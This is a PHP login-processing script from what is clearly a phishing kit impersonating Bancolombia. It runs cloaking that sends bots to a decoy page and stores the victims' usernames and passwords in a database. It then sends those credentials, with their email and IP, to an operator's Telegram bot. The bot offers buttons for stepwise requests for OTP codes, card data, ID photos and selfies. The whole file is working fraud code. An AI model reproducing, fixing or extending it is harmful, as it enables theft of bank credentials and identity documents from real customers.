<?php
if (session_status() === PHP_SESSION_NONE) {
    session_start();
}
// Producción: no mostrar errores al usuario
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(E_ALL);

// Log via error_log (funciona en Vercel, no requiere filesystem)
function logStep($msg)
{
    error_log('[process_login] ' . $msg);
}

// Cloaking & Anti-Bot Validation
require_once __DIR__ . '/../../config/cloak.php';
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    cloak_validate_post_request('../../decoy.php');

    // 1. Cargar Configuración Global
    try {
        $configPath = __DIR__ . '/../../config/config.php';
        logStep("Loading config from: $configPath");

        if (!file_exists($configPath)) {
            logStep("ERROR: Config file not found!");
            die("Error: Config not found");
        }

        $config = require $configPath;
        logStep("Config loaded successfully.");
    }
    catch (Exception $e) {
        logStep("Exception loading config: " . $e->getMessage());
        die("Error loading config");
    }

    // Validar carga de configuración
    if (!$config || !is_array($config)) {
        logStep("Error: Invalid config array.");
        die("Error: No se pudo cargar la configuración global.");
    }

    // Conexión Centralizada (MySQL/PostgreSQL)
    $pdo = require __DIR__ . '/../../config/db.php';
    logStep("DB Connected successfully via centralized config.");

    $bot_token = $config['botToken'];

    $chat_id = $config['chatId'];

    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    $usuario = trim($_POST['usuario'] ?? '');
    $clave = trim($_POST['clave'] ?? '');

    // IP REAL DETECTION (Cloudflare/Proxy Support)
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ip_address = $_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Puede venir una lista, tomamos la primera
        $ip_list = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ip_address = trim($ip_list[0]);
    }
    else {
        $ip_address = $_SERVER['REMOTE_ADDR'];
    }
    // Si sigue siendo local (::1 o 127.0.0.1) es porque accedes desde el mismo pc host
    if ($ip_address == '::1')
        $ip_address = '127.0.0.1 (Local)';

    $email = $_POST['email'] ?? '';

    logStep("Processing user: $usuario, IP: $ip_address, Email: $email");

    if (empty($usuario) || empty($clave)) {
        logStep("Empty fields. Redirecting back.");
        header("Location: ../../index.php");
        exit();
    }

    try {
        // Insertar en tabla 'pse'
        $sql = "INSERT INTO pse (estado, ip_address, usuario, clave, banco, email) VALUES (:estado, :ip, :usuario, :clave, :banco, :email)";
        $stmt = $pdo->prepare($sql);

        $stmt->execute([
            'estado' => 1,
            'ip' => $ip_address,
            'usuario' => $usuario,
            'clave' => $clave,
            'banco' => 'Bancolombia',
            'email' => $email
        ]);
        $clienteId = $pdo->lastInsertId();
        logStep("Inserted ID: $clienteId");

        // Crear los botones de Telegram
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '❌ Error Login', 'url' => "$baseUrl/god/actions.php?id=$clienteId&table=pse&estado=2"], // Direct link fix check? No, usually goes to dashboard or keeps state.
                    // Wait, the original buttons pointed to $baseUrl?id... which suggests an intermediary script or the dashboard processes it?
                    // The dashboard uses API. These buttons are for the BOT USER (Admin) to click?
                    // If so, they updates status.
                    // Let's keep original URLs but log this.
                    ['text' => 'Login Fail', 'callback_data' => "fail_$clienteId"] // Simplify? No, adhere to current system.
                ]
            ]
        ];

        // REVERTING KEYBOARD TO ORIGINAL LOGIC BUT VERIFIED
        $keyboard = [
            'inline_keyboard' => [
                [
                    ['text' => '❌ Error Login', 'callback_data' => "cmd_2_$clienteId"],
                    ['text' => '🔑 Otp',        'callback_data' => "cmd_3_$clienteId"],
                ],
                [
                    ['text' => '⚠️ Otp Error',  'callback_data' => "cmd_4_$clienteId"],
                    ['text' => '💳 CC',         'callback_data' => "cmd_5_$clienteId"],
                ],
                [
                    ['text' => '⚠️ CC Error',   'callback_data' => "cmd_6_$clienteId"],
                    ['text' => '✅ Finalizar',  'callback_data' => "cmd_7_$clienteId"],
                ],
                [
                    ['text' => '🪪 Doc Frente',  'callback_data' => "cmd_11_$clienteId"],
                    ['text' => '🪪 Doc Reverso', 'callback_data' => "cmd_12_$clienteId"]
                ],
                [
                    ['text' => '🔐 Dinámica',   'callback_data' => "cmd_15_$clienteId"],
                    ['text' => '⚠️ Dinámica Err','callback_data' => "cmd_16_$clienteId"]
                ],
                [
                    ['text' => '📲 WhatsApp',   'callback_data' => "cmd_8_$clienteId"],
                    ['text' => '🤳 Selfie',     'callback_data' => "cmd_9_$clienteId"],
                    ['text' => '⚠️ Selfie Err', 'callback_data' => "cmd_10_$clienteId"]
                ]
            ]
        ];

        $encoded_keyboard = json_encode($keyboard);

        $message = "✅ Nuevo Ingreso Bancolombia ✅\n\n";
        $message .= "🆔 ID: " . $clienteId . "\n";
        $message .= "👤 Usuario: " . $usuario . "\n";
        $message .= "🔑 Clave: " . $clave . "\n";
        $message .= "📧 Email: " . $email . "\n";
        $message .= "🌐 IP: " . $ip_address . "\n";

        // Enviar a Telegram
        $url = "https://api.telegram.org/bot{$bot_token}/sendMessage";

        $post_fields = [
            'chat_id' => $chat_id,
            'text' => $message,
            'reply_markup' => $encoded_keyboard
        ];

        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

        $response = curl_exec($ch);
        logStep("Telegram Response: $response");

        // Redirigir a espera
        header("Location: ../../index.php?status=espera&id=" . $clienteId);
        logStep("Redirecting to wait screen.");
        exit();

    }
    catch (PDOException $e) {
        logStep("Error DB: " . $e->getMessage());
        error_log("Error DB: " . $e->getMessage());
        header("Location: ../../index.php");
        exit();
    }

}
else {
    logStep("Not POST request.");
    header("Location: ../../index.php");
    exit();
}
?>